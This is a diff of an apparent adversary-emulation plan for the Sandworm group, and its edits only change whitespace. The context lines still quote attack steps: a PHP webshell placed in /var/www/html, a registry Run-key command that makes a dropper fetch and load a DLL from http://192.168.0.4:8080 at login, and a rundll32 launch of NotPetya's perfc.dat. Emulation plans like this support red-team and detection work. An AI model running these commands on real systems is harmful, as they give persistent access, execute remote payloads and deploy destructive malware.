@@ -23,13 +23,13 @@ Sandworm then deploys a PHP webshell for persistent access.
 ```
 Compromised user info:
 
-User:	fherbert
+User: fherbert
 
 File write: /tmp/search.php, /var/www/html/search.php
 
 System: 10.0.1.5 / caladan
 
-C2:	192.168.0.4 connects to 10.0.1.5:443 via HTTPS (self signed cert)
+C2: 192.168.0.4 connects to 10.0.1.5:443 via HTTPS (self signed cert)
 ```
 
 ### ☣️ Procedures
@@ -326,7 +326,7 @@ The exaramel dropper downloads and executes an Exaramel DLL.
 ```
 Compromised user info:
 
-User:	fherbert@WORKGROUP
+User: fherbert@WORKGROUP
 
 System: 10.0.1.7 / gammu
 
@@ -397,6 +397,7 @@ This will execute a Exaramel-Windows dropper on fherbert login.
 
 # Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.
 ```
+
 ```bash
 reg.exe ADD HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d "C:\Windows\wsmprovav.exe http://192.168.0.4:8080/getFile/wsmprovav.dll C:\Windows\wsmprovav.dll"
 ```
@@ -727,6 +728,7 @@ NotPetya copies and executes itself on 10.0.1.8.
 
 # NotPetya executes the scheduled task to reboot the host.
 ```
+
 ```bash
 rundll32.exe C:\Windows\perfc.dat,"#1"
 ```
